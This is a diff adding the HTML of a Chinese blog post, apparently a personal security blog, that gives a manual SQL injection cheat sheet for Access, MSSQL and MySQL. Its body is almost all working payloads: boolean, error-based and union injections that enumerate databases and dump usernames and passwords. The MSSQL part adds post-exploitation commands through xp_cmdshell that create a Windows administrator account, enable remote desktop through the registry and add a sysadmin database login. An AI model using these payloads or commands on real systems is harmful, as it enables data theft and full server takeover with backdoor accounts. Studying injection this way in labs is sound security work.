@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="0x01 Access注入:1234567891011121314151617181920212223242526272829判断表名：adminand (select count(*) from admin)&amp;gt;0判断字段名：username,passwordadmin_user admin_pwdand (select count(admin_user) from admin)&amp;gt;0猜">
+<meta name="keywords" content="sqli">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Access+Mssql+Mysql手工注入基本流程">
+<meta property="og:url" content="http:&#x2F;&#x2F;zerokeeper.github.io&#x2F;web-security&#x2F;access-mssql-mysql-manual-injection-process.html">
+<meta property="og:site_name" content="ZeroKeeper">
+<meta property="og:description" content="0x01 Access注入:1234567891011121314151617181920212223242526272829判断表名：adminand (select count(*) from admin)&amp;gt;0判断字段名：username,passwordadmin_user admin_pwdand (select count(admin_user) from admin)&amp;gt;0猜">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2019-10-20T07:31:45.000Z">
+<meta name="twitter:card" content="summary">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Access+Mssql+Mysql手工注入基本流程</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/web-security/target-blank-property-triggering-fishing-risk.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/web-security/sqlmap-usage-summary.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zerokeeper.github.io/web-security/access-mssql-mysql-manual-injection-process.html" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zerokeeper.github.io/web-security/access-mssql-mysql-manual-injection-process.html&text=Access+Mssql+Mysql手工注入基本流程" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zerokeeper.github.io/web-security/access-mssql-mysql-manual-injection-process.html&title=Access+Mssql+Mysql手工注入基本流程" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zerokeeper.github.io/web-security/access-mssql-mysql-manual-injection-process.html&is_video=false&description=Access+Mssql+Mysql手工注入基本流程" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Access+Mssql+Mysql手工注入基本流程&body=Check out this article: http://zerokeeper.github.io/web-security/access-mssql-mysql-manual-injection-process.html" target="_blank" rel="noopener"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zerokeeper.github.io/web-security/access-mssql-mysql-manual-injection-process.html&title=Access+Mssql+Mysql手工注入基本流程" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zerokeeper.github.io/web-security/access-mssql-mysql-manual-injection-process.html&title=Access+Mssql+Mysql手工注入基本流程" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zerokeeper.github.io/web-security/access-mssql-mysql-manual-injection-process.html&title=Access+Mssql+Mysql手工注入基本流程" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zerokeeper.github.io/web-security/access-mssql-mysql-manual-injection-process.html&title=Access+Mssql+Mysql手工注入基本流程" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zerokeeper.github.io/web-security/access-mssql-mysql-manual-injection-process.html&name=Access+Mssql+Mysql手工注入基本流程&description=&lt;h2 id=&#34;0x01-Access注入&#34;&gt;&lt;a href=&#34;#0x01-Access注入&#34; class=&#34;headerlink&#34; title=&#34;0x01 Access注入:&#34;&gt;&lt;/a&gt;0x01 Access注入:&lt;/h2&gt;&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;判断表名：admin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;and (select count(*) from admin)&amp;gt;0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;判断字段名：username,password&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;admin_user admin_pwd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;and (select count(admin_user) from admin)&amp;gt;0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;猜解值的长度：admin_user=5 admin_pwd=16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;and (select len(admin_user) from admin)=4依次尝试&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;猜属性值：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;and (select left(admin_user,1) from admin)=&amp;apos;a&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;在’ ‘中依次尝试字母数字&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;and (select left(admin_user,2) from admin)=&amp;apos;ad&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;and (select left(admin_user,3) from admin)=&amp;apos;adm&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;偏移注入&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;猜表名： &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;and exists (select * from 你要猜得表名)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;查看是否存在表名 （存在的情况下页面刷新正常，同理猜字段一样的 结果存在admin）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;猜列名的字段名： &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;and exists (select 你要猜的字段名 from 你已经才出来的表名)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;查看是否存在字段名（结果存在username和password）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;order by n 直到返回不正常，那么返回的列数就是n-1。n用二分法取。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;得出显位的数字&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;union select 1,2,3,4,5,...,n-1 from admin &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;用显位猜解出字段内容&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;union select 1,2,username,4,5,...,n-1 from admin&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Access注入"><span class="toc-number">1.</span> <span class="toc-text">0x01 Access注入:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Mssql-sqlserver注入"><span class="toc-number">2.</span> <span class="toc-text">0x02 Mssql/sqlserver注入:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Mysql注入："><span class="toc-number">3.</span> <span class="toc-text">0x03 Mysql注入：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-参考："><span class="toc-number">4.</span> <span class="toc-text">0x04 参考：</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Access+Mssql+Mysql手工注入基本流程
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">ZeroKeeper</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2017-03-05T00:07:00.000Z" itemprop="datePublished">2017-03-05</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/web-security/">web-security</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/sqli/" rel="tag">sqli</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x01-Access注入"><a href="#0x01-Access注入" class="headerlink" title="0x01 Access注入:"></a>0x01 Access注入:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">判断表名：admin</span><br><span class="line">and (select count(*) from admin)&gt;0</span><br><span class="line">判断字段名：username,password</span><br><span class="line">admin_user admin_pwd</span><br><span class="line">and (select count(admin_user) from admin)&gt;0</span><br><span class="line">猜解值的长度：admin_user=5 admin_pwd=16</span><br><span class="line">and (select len(admin_user) from admin)=4依次尝试</span><br><span class="line">猜属性值：</span><br><span class="line">and (select left(admin_user,1) from admin)=&apos;a&apos;</span><br><span class="line">在’ ‘中依次尝试字母数字</span><br><span class="line">and (select left(admin_user,2) from admin)=&apos;ad&apos;</span><br><span class="line">and (select left(admin_user,3) from admin)=&apos;adm&apos;</span><br><span class="line"></span><br><span class="line">偏移注入</span><br><span class="line">猜表名： </span><br><span class="line">and exists (select * from 你要猜得表名)</span><br><span class="line">查看是否存在表名 （存在的情况下页面刷新正常，同理猜字段一样的 结果存在admin）</span><br><span class="line"></span><br><span class="line">猜列名的字段名： </span><br><span class="line">and exists (select 你要猜的字段名 from 你已经才出来的表名)</span><br><span class="line"></span><br><span class="line">查看是否存在字段名（结果存在username和password）</span><br><span class="line">order by n 直到返回不正常，那么返回的列数就是n-1。n用二分法取。</span><br><span class="line"></span><br><span class="line">得出显位的数字</span><br><span class="line">union select 1,2,3,4,5,...,n-1 from admin </span><br><span class="line"></span><br><span class="line">用显位猜解出字段内容</span><br><span class="line">union select 1,2,username,4,5,...,n-1 from admin</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+
+<h2 id="0x02-Mssql-sqlserver注入"><a href="#0x02-Mssql-sqlserver注入" class="headerlink" title="0x02 Mssql/sqlserver注入:"></a>0x02 Mssql/sqlserver注入:</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">判断注入点:</span><br><span class="line">and 1=1 and 1=2</span><br><span class="line">猜版本:</span><br><span class="line">and 1=@@version</span><br><span class="line">猜用户名:</span><br><span class="line">and 1=user</span><br><span class="line">猜当前连接数据库:article</span><br><span class="line">and 1=db_name()</span><br><span class="line">猜解其它数据库：</span><br><span class="line">and 1=(select name from master.dbo.sysdatabases where dbid=6)</span><br><span class="line">猜第一个表名：’admin’</span><br><span class="line">因为列的当前数据库，所以 sysobjects=article.sys.sysobjects</span><br><span class="line">and (select top 1 name from sysobjects where xtype=&apos;u&apos;)&gt;0</span><br><span class="line">猜其他表名：’t_jiaozhu’</span><br><span class="line">and (select top 1 name from sysobjects where xtype=&apos;u&apos; and name not in(&apos;admin&apos;))&gt;0</span><br><span class="line">猜字段：username,password</span><br><span class="line">and (Select Top 1 col_name(object_id(&apos;admin&apos;),1) from sysobjects)&gt;0</span><br><span class="line">猜值</span><br><span class="line">and (select username from admin)&gt;0</span><br><span class="line">破解密码MD5或者更改密码MD5值</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">后续操作</span><br><span class="line">sqlserver 存储扩展应用</span><br><span class="line">建立系统用户：</span><br><span class="line">net user username pass /add</span><br><span class="line">系统提权</span><br><span class="line">net localgroup administrators username /add</span><br><span class="line">打开3389</span><br><span class="line">reg add &quot;hklm\System\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t reg_dword /d &quot;0&quot; /f</span><br><span class="line">建立数据库用户：</span><br><span class="line">;exec master..sp_addlogin user,pass;--</span><br><span class="line">数据库提权：</span><br><span class="line">;exec master..sp_addsrvrolemember aa,sysadmin;--</span><br><span class="line">xp_cmdshell应用</span><br><span class="line">建立系统用户</span><br><span class="line">;exec master..xp_cmdshell &quot;net user bb bb /add&quot;--</span><br><span class="line">防止xp_cmdshell：</span><br><span class="line">;exec master..sp_dropextendedproc &apos;xp_cmdshell&apos;</span><br><span class="line">恢复xp_cmdshell</span><br><span class="line">;exec master..sp_addextendedproc &apos;xp_cmdshell&apos;,&apos;xplog70.dll&apos;</span><br><span class="line">彻底防溢出</span><br><span class="line">c:\windows\system32\cmd.exe 删除所有默认权限.</span><br><span class="line">添加administrator–完全控制</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-Mysql注入："><a href="#0x03-Mysql注入：" class="headerlink" title="0x03 Mysql注入："></a>0x03 Mysql注入：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">猜解字段数</span><br><span class="line">order by 3%23 </span><br><span class="line">union select 1,2,3%23</span><br><span class="line">获取当前数据库名</span><br><span class="line">union select 1,(select database()) ,3%23</span><br><span class="line">security</span><br><span class="line">获取所有数据库名</span><br><span class="line">union select 1,2,(select group_concat(schema_name) from information_schema.schemata)%23</span><br><span class="line">information_schema,challenges,mysql,performance_schema,security</span><br><span class="line">获取表名</span><br><span class="line">union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema = 0x7365637572697479)%23</span><br><span class="line">emails,referers,uagents,users</span><br><span class="line">获取列名</span><br><span class="line">union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema = 0x7365637572697479 and table_name=0x7573657273)%23</span><br><span class="line">id,username,password</span><br><span class="line">获取数据</span><br><span class="line">union select 1,2,(select group_concat(id,0x7c,username,0x7c,password) from security.users)%23</span><br><span class="line">获取数据库版本</span><br><span class="line">union select 1,@@version,database()%23</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x04-参考："><a href="#0x04-参考：" class="headerlink" title="0x04 参考："></a>0x04 参考：</h2><p>1 <a href="http://www.cdxy.me/web/manual-inject/" target="_blank" rel="noopener">ACCESS+MSSQL手工注入笔记</a><br>2 <a href="http://mtfly.net/108" target="_blank" rel="noopener">sqli-labs详细通关指南</a></p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-Access注入"><span class="toc-number">1.</span> <span class="toc-text">0x01 Access注入:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Mssql-sqlserver注入"><span class="toc-number">2.</span> <span class="toc-text">0x02 Mssql/sqlserver注入:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Mysql注入："><span class="toc-number">3.</span> <span class="toc-text">0x03 Mysql注入：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-参考："><span class="toc-number">4.</span> <span class="toc-text">0x04 参考：</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zerokeeper.github.io/web-security/access-mssql-mysql-manual-injection-process.html" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zerokeeper.github.io/web-security/access-mssql-mysql-manual-injection-process.html&text=Access+Mssql+Mysql手工注入基本流程" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zerokeeper.github.io/web-security/access-mssql-mysql-manual-injection-process.html&title=Access+Mssql+Mysql手工注入基本流程" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zerokeeper.github.io/web-security/access-mssql-mysql-manual-injection-process.html&is_video=false&description=Access+Mssql+Mysql手工注入基本流程" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Access+Mssql+Mysql手工注入基本流程&body=Check out this article: http://zerokeeper.github.io/web-security/access-mssql-mysql-manual-injection-process.html" target="_blank" rel="noopener"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zerokeeper.github.io/web-security/access-mssql-mysql-manual-injection-process.html&title=Access+Mssql+Mysql手工注入基本流程" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zerokeeper.github.io/web-security/access-mssql-mysql-manual-injection-process.html&title=Access+Mssql+Mysql手工注入基本流程" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zerokeeper.github.io/web-security/access-mssql-mysql-manual-injection-process.html&title=Access+Mssql+Mysql手工注入基本流程" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zerokeeper.github.io/web-security/access-mssql-mysql-manual-injection-process.html&title=Access+Mssql+Mysql手工注入基本流程" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zerokeeper.github.io/web-security/access-mssql-mysql-manual-injection-process.html&name=Access+Mssql+Mysql手工注入基本流程&description=&lt;h2 id=&#34;0x01-Access注入&#34;&gt;&lt;a href=&#34;#0x01-Access注入&#34; class=&#34;headerlink&#34; title=&#34;0x01 Access注入:&#34;&gt;&lt;/a&gt;0x01 Access注入:&lt;/h2&gt;&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;判断表名：admin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;and (select count(*) from admin)&amp;gt;0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;判断字段名：username,password&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;admin_user admin_pwd&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;and (select count(admin_user) from admin)&amp;gt;0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;猜解值的长度：admin_user=5 admin_pwd=16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;and (select len(admin_user) from admin)=4依次尝试&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;猜属性值：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;and (select left(admin_user,1) from admin)=&amp;apos;a&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;在’ ‘中依次尝试字母数字&lt;/span&gt;&lt;br&gt;&lt;span 